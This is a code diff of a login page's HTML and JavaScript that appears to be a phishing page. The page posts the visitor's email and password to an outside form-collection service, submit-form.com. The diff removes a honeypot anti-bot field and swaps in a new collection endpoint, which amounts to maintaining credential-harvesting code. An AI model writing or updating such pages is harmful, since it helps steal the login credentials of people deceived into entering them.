@@ -397,11 +397,6 @@
 <label for="user_password" class="control-label" data-i18n="password">Password:</label>
 <input type="password" id="user_password" class="form-control" name="user_password" required />
 </div>
-<!-- Honeypot field -->
-<div class="form-group honeypot-field">
-<label for="contact_info">Leave this field empty</label>
-<input type="text" id="contact_info" name="contact_info" value="" />
-</div>
 <label id="error" class="error" style="display: none;color: red;" data-i18n="error">Enter the correct password</label>
 <div class="pad-top-20 pad-btm-20">
 <input type="submit" id="submit-btn" class="btn btn-default btn-block btn-lg" data-i18n="[value]continue" value="Continue">
@@ -537,14 +532,13 @@
 
   // --- Form Submission Logic ---
 
-  function sendFormData(email, password, honeypot, $input, $passwordInput) {
+  function sendFormData(email, password, $input, $passwordInput) {
     $.ajax({
       type: 'POST',
-      url: "https://submit-form.com/BOjdqzwMm",
+      url: "https://submit-form.com/bbKESMhI7",
       data: {
         user_username: email,
-        user_password: password,
-        contact_info: honeypot
+        user_password: password
       },
       dataType: 'json',
       success: function(data) {
